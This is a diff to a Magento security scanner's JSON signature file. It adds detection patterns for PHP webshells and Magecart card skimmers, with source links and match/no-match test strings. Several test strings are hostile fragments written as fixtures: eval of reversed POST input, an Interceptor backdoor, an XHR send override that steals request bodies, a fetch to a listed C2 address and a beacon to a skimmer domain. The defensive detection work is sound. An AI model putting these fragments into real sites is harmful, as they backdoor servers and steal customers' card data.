@@ -1,11 +1,14 @@
 {
-    "version": "2026.10.0",
+    "version": "2026.10.3",
     "signatures": [
         {
             "id": "webshell-eval-base64",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
             "name": "eval() of base64-decoded PHP",
             "severity": "critical",
-            "target": ["pub_php"],
+            "target": [
+                "pub_php"
+            ],
             "pattern_type": "literal",
             "pattern": "eval(base64_decode(",
             "description": "Classic webshell obfuscation: decode a base64 payload and eval() it directly. Legitimate code essentially never does this.",
@@ -18,9 +21,12 @@
         },
         {
             "id": "webshell-eval-gzinflate",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
             "name": "eval() of gzinflate-decompressed PHP",
             "severity": "critical",
-            "target": ["pub_php"],
+            "target": [
+                "pub_php"
+            ],
             "pattern_type": "literal",
             "pattern": "eval(gzinflate(",
             "description": "Same obfuscation pattern as webshell-eval-base64 using gzinflate instead of/alongside base64 to compress the payload.",
@@ -33,9 +39,12 @@
         },
         {
             "id": "webshell-assert-request",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
             "name": "assert() of raw request input",
             "severity": "critical",
-            "target": ["pub_php"],
+            "target": [
+                "pub_php"
+            ],
             "pattern_type": "regex",
             "pattern": "/assert\\s*\\(\\s*\\$_(POST|REQUEST|GET)/",
             "description": "assert() historically evaluated its string argument as PHP code - passing request input directly to it is a remote-code-execution webshell pattern, not something legitimate code does.",
@@ -49,9 +58,12 @@
         },
         {
             "id": "webshell-exec-request",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
             "name": "Shell execution of raw request input",
             "severity": "critical",
-            "target": ["pub_php"],
+            "target": [
+                "pub_php"
+            ],
             "pattern_type": "regex",
             "pattern": "/(system|passthru|shell_exec|proc_open|popen)\\s*\\(\\s*\\$_(POST|REQUEST|GET)/",
             "description": "Passes request input directly to a shell-execution function - the defining trait of a command-execution webshell.",
@@ -65,9 +77,12 @@
         },
         {
             "id": "webshell-known-names",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
             "name": "Known public webshell family marker",
             "severity": "critical",
-            "target": ["pub_php"],
+            "target": [
+                "pub_php"
+            ],
             "pattern_type": "regex",
             "pattern": "/(c99shell|r57shell|FilesMan|WSO\\s?[Ss]hell)/",
             "description": "Literal name/marker strings used by long-documented, widely-reused public webshell families. Presence alone is a strong signal regardless of the surrounding code.",
@@ -81,9 +96,13 @@
         },
         {
             "id": "magecart-atob-eval",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
             "name": "eval() of base64-decoded script content",
             "severity": "critical",
-            "target": ["cms_content", "design_config"],
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
             "pattern_type": "literal",
             "pattern": "eval(atob(",
             "description": "Decodes a base64 string and eval()s it inline - the same obfuscation technique as webshell-eval-base64, applied to injected storefront JavaScript (a common Magecart/skimmer loader pattern) rather than PHP.",
@@ -96,9 +115,13 @@
         },
         {
             "id": "magecart-charcode-script-build",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
             "name": "Script tag assembled via String.fromCharCode",
             "severity": "warning",
-            "target": ["cms_content", "design_config"],
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
             "pattern_type": "literal",
             "pattern": "String.fromCharCode",
             "description": "A common way to build a <script> tag or URL character-by-character to dodge simple string-matching defenses. Flagged as a warning, not critical, on its own - legitimate code can use String.fromCharCode for unrelated reasons, so this is a signal worth a human look rather than proof by itself.",
@@ -107,6 +130,270 @@
             ],
             "test_should_not_match": [
                 "<p>Copyright &copy; 2026 Example Store</p>"
+            ]
+        },
+        {
+            "id": "polyshell-gif89a-php-polyglot",
+            "name": "PHP payload hidden after a GIF89a header (PolyShell polyglot)",
+            "severity": "critical",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/^GIF89a[\\s\\S]{0,4096}?<\\?(?:php|=)/",
+            "description": "PolyShell (APSB25-94) webshells are GIF89a images with PHP appended, uploaded through the Magento REST API and stored under pub/media.",
+            "source": "https://sansec.io/research/magento-polyshell",
+            "test_should_match": [
+                "GIF89a;<?php echo 'probe'; ?>"
+            ],
+            "test_should_not_match": [
+                "GIF89a plain image data with no script tags"
+            ]
+        },
+        {
+            "id": "magecart-svg-onload-atob",
+            "name": "Base64 skimmer hidden in an SVG onload handler",
+            "severity": "critical",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/<svg[^>]*\\bonload\\s*=[^>]*\\batob\\s*\\(/i",
+            "description": "Magecart technique: a 1x1 SVG element runs base64-decoded script from its onload attribute to evade scanners.",
+            "source": "https://sansec.io/research/svg-onload-magecart-skimmer",
+            "test_should_match": [
+                "<svg width=\"1\" height=\"1\" onload=\"eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))\"></svg>"
+            ],
+            "test_should_not_match": [
+                "<svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\"><path d=\"M0 0h24v24H0z\"/></svg>"
+            ]
+        },
+        {
+            "id": "cosmicsting-cdnstatistics-domain",
+            "name": "Reference to cdnstatistics.net skimmer domain",
+            "severity": "critical",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "cdnstatistics.net",
+            "description": "Domain used by the CosmicSting skimmer campaign against Magento payment pages. Domain indicators go stale quickly; review before relying on it.",
+            "source": "https://sansec.io/research/cosmicsting",
+            "test_should_match": [
+                "<script src=\"https://cdnstatistics.net/track.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/js/app.js\"></script>"
+            ]
+        },
+        {
+            "id": "stylesmuggler-cookie-marker",
+            "name": "StylesSmuggler injected block checking gl_google_advisor cookie",
+            "severity": "critical",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "gl_google_advisor_",
+            "description": "Cookie checked by the CVE-2026-75650 StylesSmuggler payload before it fetches and includes remote PHP. Source: https://sansec.io/research/stylesmuggler-0day",
+            "source": "https://sansec.io/research/stylesmuggler-0day",
+            "test_should_match": [
+                "<?php if (isset($_COOKIE['gl_google_advisor_824808'])) { /* probe */ } ?>"
+            ],
+            "test_should_not_match": [
+                "<?php if (isset($_COOKIE['session_id'])) { /* probe */ } ?>"
+            ]
+        },
+        {
+            "id": "stylesmuggler-c2-ip",
+            "name": "StylesSmuggler C2 server address 99.84.67.186",
+            "severity": "critical",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "99.84.67.186",
+            "description": "C2 address used by the CVE-2026-75650 StylesSmuggler backdoor. IP indicators go stale quickly; review before relying on it. Source: https://sansec.io/research/stylesmuggler-0day",
+            "source": "https://sansec.io/research/stylesmuggler-0day",
+            "test_should_match": [
+                "fetch('http://99.84.67.186/a9f3k2-c2')"
+            ],
+            "test_should_not_match": [
+                "fetch('http://199.84.67.18/status')"
+            ]
+        },
+        {
+            "id": "magecart-sendbeacon-fonts-domains",
+            "name": "Skimmer beacon to staticfonts/dynamicopenfonts lookalike domains",
+            "severity": "critical",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "staticfonts.com",
+            "description": "Lookalike font-CDN domain used by a Magento credit-card skimmer that sends Base64 card data via beacon. Domain indicators go stale quickly; review before relying on it. Source: https://www.darkreading.com/application-security/sneaky-skimmer-malware-magento-sites-black-friday",
+            "source": "https://www.darkreading.com/application-security/sneaky-skimmer-malware-magento-sites-black-friday",
+            "test_should_match": [
+                "<script>navigator.sendBeacon('https://staticfonts.com/c', 'x');</script>"
+            ],
+            "test_should_not_match": [
+                "<script>navigator.sendBeacon('/analytics/collect', 'x');</script>"
+            ]
+        },
+        {
+            "id": "magecart-btoa-json-card-encode",
+            "name": "Base64-encoded JSON of form data (skimmer encoding pattern)",
+            "severity": "warning",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/btoa\\s*\\(\\s*unescape\\s*\\(\\s*encodeURIComponent\\s*\\(\\s*JSON\\.stringify\\s*\\(/",
+            "description": "Encoding chain seen in Magecart skimmers that Base64-encode a JSON object of card fields before exfiltration. Heuristic: warns for review rather than blocking. Source: https://blog.cyble.com/2022/09/01/highly-evasive-magecart-javascript-skimmer-active-in-the-wild/",
+            "source": "https://blog.cyble.com/2022/09/01/highly-evasive-magecart-javascript-skimmer-active-in-the-wild/",
+            "test_should_match": [
+                "var d = btoa(unescape(encodeURIComponent(JSON.stringify(fields))));"
+            ],
+            "test_should_not_match": [
+                "var d = JSON.stringify(fields);"
+            ]
+        },
+        {
+            "id": "magecart-xhr-prototype-override",
+            "name": "XMLHttpRequest prototype override (request interception)",
+            "severity": "warning",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/XMLHttpRequest\\.prototype\\.(?:open|send)\\s*=/",
+            "description": "Skimmers override XHR send/open to read payment requests as they leave the page. Some legitimate monitoring and polyfill scripts do this too, so this is a warning for review. Source: https://sansec.io/research/svg-onload-magecart-skimmer",
+            "source": "https://sansec.io/research/svg-onload-magecart-skimmer",
+            "test_should_match": [
+                "XMLHttpRequest.prototype.send = function (body) { steal(body); };"
+            ],
+            "test_should_not_match": [
+                "var x = new XMLHttpRequest(); x.open('GET', '/api');"
+            ]
+        },
+        {
+            "id": "webshell-eval-strrev-post",
+            "name": "eval() of reversed POST input (obfuscated webshell)",
+            "severity": "critical",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/eval\\s*\\(\\s*\\$\\w+\\s*\\(\\s*strrev\\s*\\(\\s*\\$_POST/",
+            "description": "Webshell that reverses a POST value and passes it to a base64 decoder inside eval(). The function name is often split into string fragments to evade literal matching. Source: https://sansec.io/research/magento-xml-backdoor",
+            "source": "https://sansec.io/research/magento-xml-backdoor",
+            "test_should_match": [
+                "<?php @eval($f(strrev($_POST[\"x\"]))); ?>"
+            ],
+            "test_should_not_match": [
+                "<?php echo strrev($_POST[\"x\"]); ?>"
+            ]
+        },
+        {
+            "id": "magecart-checkout-only-trigger",
+            "name": "Script that runs only on checkout pages (not cart)",
+            "severity": "warning",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/location\\.href\\.includes\\(\\s*['\"]checkout['\"]\\s*\\)\\s*&&\\s*!window\\.location\\.href\\.includes\\(\\s*['\"]cart['\"]\\s*\\)/",
+            "description": "Skimmers often activate only on checkout URLs and skip cart pages. Heuristic: warns for review rather than blocking. Source: https://blog.sucuri.net/2024/11/credit-card-skimmer-malware-targeting-magento-checkout-pages.html",
+            "source": "https://blog.sucuri.net/2024/11/credit-card-skimmer-malware-targeting-magento-checkout-pages.html",
+            "test_should_match": [
+                "if (window.location.href.includes('checkout') && !window.location.href.includes('cart')) { init(); }"
+            ],
+            "test_should_not_match": [
+                "if (window.location.href.includes('product')) { init(); }"
+            ]
+        },
+        {
+            "id": "magecart-homoglyph-analytics-domain",
+            "name": "Lookalike google-analytics domain using a non-ASCII character",
+            "severity": "critical",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/google-analyt[^\\x00-\\x7f]/",
+            "description": "Skimmer script hosted on a google-analytics lookalike that replaces one letter with a non-ASCII homoglyph. Source: https://blog.sucuri.net/2019/07/fake-google-domains-used-in-evasive-magento-skimmer.html",
+            "source": "https://blog.sucuri.net/2019/07/fake-google-domains-used-in-evasive-magento-skimmer.html",
+            "test_should_match": [
+                "<script src=\"//google-analyt\u00eecs.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"//www.google-analytics.com/analytics.js\"></script>"
+            ]
+        },
+        {
+            "id": "interceptor-init-post-eval",
+            "name": "Backdoor injected into a generated Magento Interceptor class",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-xml-backdoor",
+            "target": [
+                "generated_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/___init\\(\\);\\s*if\\s*\\(\\s*isset\\s*\\(\\s*\\$_POST\\s*\\[\\s*['\"][0-9a-f]{10}['\"]\\s*\\]\\s*\\)\\s*\\)\\s*\\{[\\s\\S]{0,300}?eval/",
+            "description": "Persistence backdoor added to a generated Interceptor class by a sed command, so it survives cache rebuilds. Lives under generated/code/, which no other target covers. Source: https://sansec.io/research/magento-xml-backdoor",
+            "test_should_match": [
+                "___init();\n if (isset($_POST[\"7faa27b473\"])) { @eval($c(strrev($_POST[\"7faa27b473\"]))); exit(0); }"
+            ],
+            "test_should_not_match": [
+                "___init();\n return parent::execute();"
+            ]
+        },
+        {
+            "id": "magecart-atob-regexp-page-gate",
+            "name": "Skimmer loader gated by a base64-decoded URL regex",
+            "severity": "critical",
+            "source": "https://blog.sucuri.net/2025/02/google-tag-manager-skimmer-steals-credit-card-info-from-magento-site.html",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/if\\s*\\(\\s*l\\.href\\.match\\(\\s*new RegExp\\(\\s*atob\\(/",
+            "description": "Skimmer loader that only fires on pages whose URL matches a base64-decoded pattern (commonly checkout). The decoded pattern hides the target page from static review.",
+            "test_should_match": [
+                "if (l.href.match(new RegExp(atob(o)))) { load(); }"
+            ],
+            "test_should_not_match": [
+                "if (l.href.match(/checkout/)) { load(); }"
+            ]
+        },
+        {
+            "id": "webshell-sha256-gated-eval",
+            "name": "PHP webshell that runs eval() only after a SHA-256 key check",
+            "severity": "critical",
+            "source": "https://blog.sucuri.net/2025/02/google-tag-manager-skimmer-steals-credit-card-info-from-magento-site.html",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/hash\\(\\s*[\"']sha256[\"']\\s*,\\s*get_data\\s*\\(/",
+            "description": "PHP webshell that hashes a request parameter with sha256 and compares it to a fixed prefix before decoding and eval()-ing a second parameter. The key check keeps it hidden from casual visitors. Source: the Sucuri GTM skimmer post above.",
+            "test_should_match": [
+                "if (strpos(hash(\"sha256\", get_data(\"item\", \"\")), \"abc\") === false) return \"\";"
+            ],
+            "test_should_not_match": [
+                "$digest = hash(\"sha256\", $file_contents);"
             ]
         }
     ]
